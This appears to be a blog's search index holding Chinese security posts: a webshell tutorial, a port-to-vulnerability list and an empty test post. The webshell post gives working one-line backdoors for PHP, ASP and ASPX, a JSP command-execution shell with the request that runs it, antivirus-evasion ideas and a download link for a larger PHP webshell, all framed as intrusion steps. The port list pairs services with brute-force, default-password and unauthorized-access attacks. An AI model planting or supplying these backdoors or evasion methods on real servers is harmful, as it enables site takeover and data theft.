<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>木马详解</title>
      <link href="/2023/07/11/%E6%9C%A8%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/07/11/%E6%9C%A8%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="最全木马详解"><a href="#最全木马详解" class="headerlink" title="最全木马详解"></a>最全木马详解</h1><p>简单木马种类：asp、php、jsp、aspx<br>变形木马：htaccess，cer<br>先来看看最简单的一句话木马：<br>   <?php @eval($_POST['attack']);?></p><ul><li>代码解释：</li></ul><ol><li>@表示后面即使执行错误，也不报错：由于一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义，会暴露密码，所以我们加上@</li><li>eval（）函数表示括号内的语句字符串什么的全都当做代码执行。想执行什么代码，就把什么代码放进变量attack位置下。如果想查看目标硬盘内容，可以用php函数：opendir()和readdir()等等。想上传内容就用php函数：move_uploaded_file。想执行cmd命令，则用exec()。前提是php配置文件php.ini里，关掉安全模式safe_mode &#x3D; off，然后再看看禁用函数列表 disable_functions &#x3D; proc_open, popen, <code>exec</code> , system, shell_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。</li><li>$_POST[‘attack’]表示从页面中获得attack这个参数值。</li></ol><ul><li>入侵条件</li></ul><ol><li>木马上传成功，未被杀；</li><li>知道木马的路径在哪；</li><li>上传的木马能正常运行。</li></ol><ul><li><p>常见形式<br>常见的一句话木马：<br>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language&#x3D;”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;<br>jsp的一句话是：</p></li><li><p>木马免杀</p></li></ul><p>一般网站管理员都会安装杀毒软件，即使木马上传成功，一段时间之后也会被杀掉，所以我们要对木马进行免杀操作，把它伪装的不像一个木马躲过杀毒软件。所以我们接下来要进行木马免杀操作。</p><p>【免杀思路】：</p><p>1、将源代码进行再次编码。<br>2、将那一句话木马进行base64编码，存放在”乱七八糟”的代码中。<br>3、还是一句话木马，进行变形，只不过，这次的变形是在数组中键值对变形。很强。</p><p>小马和大马</p><p>小马和大马都是网页类型中的一种后门，是通过用来控制网站权限的，那最主要的区别就是小马是用来上传大马的。通过小马上传大马，这时候有个疑问了，那不是多此一举了，为什么要用小马来上传大马，而干嘛不直接上传大马用好了。其实这里是因为小马体积小，有比大马更强的隐蔽优势，而且有针对文件大小上传限制的漏洞，所以才有小马，小马也通常用来做留备用后门等。<br>网页小马</p><p>小马体积非常小，只有2KB那么大，隐蔽性也非常的好，因为小马的作用很简单，就是一个上传功能，就没有其它的了，它的作用仅仅是用来上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以就只能先上传小马，再接着通过小马上传大马了。小马还可以通过与图片合成一起通过IIS漏洞来运行。</p><p>Java语言编写的后台咱们使用JSP木马，与前面的一句话木马不同，菜刀中JSP木马较长，以下是一个简单的JSP小马：</p><p>&lt;%<br>    if(“123”.equals(request.getParameter(“pwd”))){<br>        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();<br>        int a &#x3D; -1;<br>        byte[] b &#x3D; new byte[2048];<br>        out.print(“<pre>");<br>        while((a=in.read(b))!=-1){<br>            out.println(new String(b));<br>        }<br>        out.print("</pre>“);<br>    }<br>%&gt;</p><p>成功上传后如果能解析的话，请求：http:&#x2F;&#x2F;服务器IP:端口&#x2F;Shell&#x2F;cmd.jsp?pwd&#x3D;123&amp;i&#x3D;ipconfig 即可执行命令。<br>网页大马</p><p>大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。</p><pre><code>中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。</code></pre><p>来看看一个大马利用实例：在虚拟机中往DVWA上传PHP大马（源码附在最后）:<br>访问木马文件123.php，提交密码123456后进入大马的功能列表，下图所示为文件管理功能：<br>在这里插入图片描述继续访问下命令执行功能（其他功能不展示了）：</p><pre><code>最后附上该PHP大马的代码（代码太长，百度云盘链接）：https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A</code></pre><p>WebShell</p><p>Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><p>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。 webshell根据功能也分为大马、小马和一句话木马，例如：&lt;%eval request(“pass”)%&gt;通常把这句话写入一个文档里面，然后文件名改成xx.asp。然后传到服务器上面。用eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。具体分类如下图：</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全，木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最全端口服务及对应漏洞</title>
      <link href="/2023/07/07/%E5%AE%89%E5%85%A8/"/>
      <url>/2023/07/07/%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="端口服务及对应漏洞"><a href="#端口服务及对应漏洞" class="headerlink" title="端口服务及对应漏洞"></a>端口服务及对应漏洞</h1><ul><li>端口号：<code>20、21</code> 服务：ftp  ，用于上传、下载文件。</li><li>端口号：<code>22</code>  服务：SSH远程连接，用于通过命令行模式 远程连接 Linux服务器或vps<br>           SSH弱口令破解、用户枚举、SSH隧道及内网代理转发、文件传输</li><li>端口号：<code>23</code> 服务：Telnet远程连接  密码爆破、弱口令</li><li>端口号：<code>25</code>  服务：SMTP邮件服务  邮件伪造</li><li>端口号：<code>53</code>  服务：DNS域名系统   DNS劫持、欺骗 vg  vg</li><li>端口号：<code>67/68</code> 服务：DHCP动态主机配置协议，</li><li>端口号：<code>69</code>  服务：tftp文件传输协议  下载、爆破和嗅探</li><li>端口号：<code>80</code> 服务：HTTP  用于 HTTP 服务提供访问功能如IIS、Apache、Nginx 等服务。第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</li><li>端口号：<code>110</code> 服务：POP3协议，邮件协议  爆破</li><li>端口号：<code>111</code> NFS</li><li>端口号：<code>139</code> 服务：Samba  爆破、未授权访问、远程代码执行</li><li>端口号：<code>143</code> 服务：IMAP 电子邮件的接收的协议。    爆破</li><li>端口号：<code>161</code>  服务：SNMP简单网络管理协议    爆破</li><li>端口号：<code>389</code>  服务：Ldap目录访问协议  注入、弱口令</li><li>端口号: <code>443</code>   服务：HTTPS 提访问功能，加密和通过安全端口传输的协议，SSL心脏滴血</li><li>端口号：<code>445</code>  用来访问共享文件夹，打印机</li><li>端口号：<code>873</code>,Rsync未授权</li><li>端口号：<code>1025</code>  NFS</li><li>端口号：<code>1433</code> 服务： SQL Server 用于供 SQL Server的TCP对外提供服务。扫描弱口令</li><li>端口号：<code>1434</code>服务： SQL Server的UDP 端口用于返回 SQL Server 使用了哪个 TCP&#x2F;IP 端口。</li><li>端口号：<code>1521</code>  服务：Oracle 数据库（收费）  TNS爆破、注入,扫描弱口令</li><li>端口号：<code>2049</code>  服务：nfs服务   上传、下载、文件共享</li><li>端口号：<code>2082/2083</code> cpanel主机管理系统登陆 （国外用较多）</li><li>端口号：<code>2222</code> DA虚拟主机管理系统登陆 （国外用较多）</li><li>端口号：<code>2601</code>,zebra路由，默认密码zebra</li><li>端口号：<code>2604</code> zebra路由，默认密码zebra</li><li>端口号：<code>3128</code> squid代理默认端口，如果没设置口令很可能就直接漫游内网了</li><li>端口号：<code>3306</code>  服务：MySql   爆破、注入、提权,扫描弱口令</li><li>端口号：<code>3312/3311</code> kangle主机管理系统登陆</li><li>端口号：<code>3389</code>  服务：远程桌面的服务端口  Shift后门</li><li>端口号：<code>4440</code> rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</li><li>端口号：<code>5432</code>  服务：PostgreSQL（PG）  ,扫描弱口令</li><li>端口号：<code>5560,7778</code>  iSqlPlus数据库 ，Port数据库</li><li>端口号：<code>5900</code>  服务：VNC 虚拟网络控制台，vnc访问:192.168.1.203:1 那么他访问服务器的真正端口是5900+1&#x3D;5901 。 弱口令</li><li>端口号：<code>5984</code>       ，CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></li><li>端口号：<code>6082</code> varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站  被直接篡改或者作为代理进入内网</li><li>端口号：<code>6379</code>  服务：Redis数据库    爆破，redis未授权</li><li>端口号：<code>7001/7002</code>    服务：WebLogic控制台    WebLogic默认弱口令，Java反序列化</li><li>端口号：<code>8080</code> 服务：TCP,传输控制协议（计算机网络，传输层，和IP协议搭配使用）,第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</li><li>端口号：<code>8083</code> Vestacp主机管理系统 （国外用较多）</li><li>端口号：<code>8088</code> 服务：Nginx：轻量级的Web服务器&#x2F;反向代理服务器及电子邮件代理服务器。,</li><li>端口号：<code>9090</code>   服务：WebSphere控制台    Java反序列化,第三方通用组件漏洞struts thinkphp jboss ganglia                           zabbix</li><li>端口号：<code>9200,9300</code> elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</li><li>端口号：<code>10000</code> Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</li><li>端口号：<code>11211</code> memcache未授权访问</li><li>端口号：<code>27017/27018</code>    服务：MongoDB   爆破、未授权访问</li><li>端口号：<code>50000</code>    SAP命令执行</li><li>端口号：<code>50070,50030</code>   hadoop默认端口未授权访问</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> port </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2023/07/07/test/"/>
      <url>/2023/07/07/test/</url>
      
        <content type="html"><![CDATA[<p>markdon</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
